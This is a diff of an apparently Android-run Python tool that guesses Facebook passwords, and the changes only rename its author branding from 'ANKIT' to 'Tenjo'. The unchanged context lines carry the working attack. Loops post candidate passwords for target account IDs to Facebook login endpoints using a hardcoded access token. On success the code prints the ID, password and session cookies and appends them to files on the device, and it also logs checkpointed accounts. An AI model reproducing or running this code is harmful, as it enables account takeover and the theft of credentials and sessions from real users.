@@ -110,7 +110,7 @@ logo=(f"""
 
 \x1b[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-\033[1;32m[\033[1;31m✓\033[1;32m] Author     : ANKITT
+\033[1;32m[\033[1;31m✓\033[1;32m] Author     : TENJO
 \033[1;32m[\033[1;31m✓\033[1;32m] GitHub     : UNKNOWN
 \033[1;32m[\033[1;31m✓\033[1;32m] Facebook.  : UNKNOWN
 \033[1;32m[\033[1;31m✓\033[1;32m] Tool Types : \033[1;33mFile × Random
@@ -130,7 +130,7 @@ def menu():
                         linex()
                         xd=input(f'{G}[{A}?{G}]{A} CHOICE : ')
                         if xd in ['1','01']:
-                                clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : /sdcard/ANKIT.txt ');linex()
+                                clear();print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE : /sdcard/Tenjo.txt ');linex()
                                 file = input(f'{G}[{A}?{G}]{G} FILE NAME : ')
                                 try:
                                         fo = open(file,'r').read().splitlines()
@@ -198,7 +198,7 @@ def menu():
                         elif xd in ['2','02']:
                                 randm()
                         elif xd in ['3','03']:
-                                os.system('xdg-open https://www.facebook.com/ANKITXHEROOZ');menu()
+                                os.system('xdg-open https://www.facebook.com/TenjoXHEROOZ');menu()
                         elif xd in ['0','05']:
                                 exit(f'\033[1;32m[\033[1;31m✓\033[1;32m] BYE BYE ')
                         else:
@@ -424,7 +424,7 @@ def afghanistan():
 def api1(ids,names,passlist):
         try:
                 global oks,loop,sim_id,device
-                sys.stdout.write(f'\r\r{G}[{R}ANKIT-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+                sys.stdout.write(f'\r\r{G}[{R}Tenjo-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -515,16 +515,16 @@ def api1(ids,names,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}ANKIT-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}Tenjo-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        open('/sdcard/ANKIT-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
+                                        open('/sdcard/Tenjo-FILE-M1-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(ids)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}ANKIT-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/ANKIT-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}Tenjo-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/Tenjo-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
@@ -538,7 +538,7 @@ def api1(ids,names,passlist):
 def api2(ids,names,passlist):
         try:
                 global oks,loop,sim_id
-                sys.stdout.write(f'\r\r{G}[{R}ANKIT-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+                sys.stdout.write(f'\r\r{G}[{R}Tenjo-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
                 fn = names.split(' ')[0]
                 try:
                         ln = names.split(' ')[1]
@@ -619,16 +619,16 @@ def api2(ids,names,passlist):
                         url = 'https://b-api.facebook.com/method/auth.login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}ANKIT-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}Tenjo-OK{G}]{G} '+ids+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        open('/sdcard/ANKIT-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
+                                        open('/sdcard/Tenjo-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(ids)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}ANKIT-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/ANKIT-CP.txt','a').write(ids+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}Tenjo-CP{G}]{Y} '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/Tenjo-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
@@ -642,7 +642,7 @@ def api2(ids,names,passlist):
 def rndm1(uid,passlist):
         global loop
         global oks
-        sys.stdout.write(f'\r\r{G}[{R}ANKIT-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r{G}[{R}Tenjo-M1{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -720,16 +720,16 @@ def rndm1(uid,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}ANKIT-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}Tenjo-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        open('/sdcard/ANKIT-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
+                                        open('/sdcard/Tenjo-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(uid)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}ANKIT-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/ANKIT-CP.txt','a').write(uid+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}Tenjo-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/Tenjo-CP.txt','a').write(uid+'|'+pas+'\n')
                                                 cps.append(uid)
                                                 break
                                         else:
@@ -743,7 +743,7 @@ def rndm1(uid,passlist):
 def rndm2(uid,passlist):
         global loop
         global oks
-        sys.stdout.write(f'\r\r{G}[{R}ANKIT-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r{G}[{R}Tenjo-M2{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -819,16 +819,16 @@ def rndm2(uid,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}ANKIT-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}Tenjo-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        open('/sdcard/ANKIT-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
+                                        open('/sdcard/Tenjo-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(uid)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}ANKIT-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/ANKIT-CP.txt','a').write(uid+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}Tenjo-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/Tenjo-CP.txt','a').write(uid+'|'+pas+'\n')
                                                 cps.append(uid)
                                                 break
                                         else:
@@ -842,7 +842,7 @@ def rndm2(uid,passlist):
 def rndm3(uid,passlist):
         global loop
         global oks
-        sys.stdout.write(f'\r\r{G}[{R}ANKIT-M3{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r{G}[{R}Tenjo-M3{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
         try:
                 for pas in passlist:
                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
@@ -918,16 +918,16 @@ def rndm3(uid,passlist):
                         url = 'https://b-graph.facebook.com/auth/login'
                         po = requests.post(url,data=data,headers=headers).json()
                         if 'session_key' in po:
-                                        print(f'\r\r{G}[{G}ANKIT-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
+                                        print(f'\r\r{G}[{G}Tenjo-OK{G}]{G} '+uid+f' | '+pas+'\033[1;97m')
                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                         print(f"\r\r{G}[{G}COOKIE{G}]>{A} "+coki)
-                                        open('/sdcard/ANKIT-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
+                                        open('/sdcard/Tenjo-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                         oks.append(uid)
                                         break
                         elif 'www.facebook.com' in po['error']['message']:
                                         if 'y' in pcp:
-                                                print(f'\r\r{G}[{Y}ANKIT-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/ANKIT-CP.txt','a').write(uid+'|'+pas+'\n')
+                                                print(f'\r\r{G}[{Y}Tenjo-CP{G}]{Y} '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/Tenjo-CP.txt','a').write(uid+'|'+pas+'\n')
                                                 cps.append(uid)
                                                 break
                                         else:
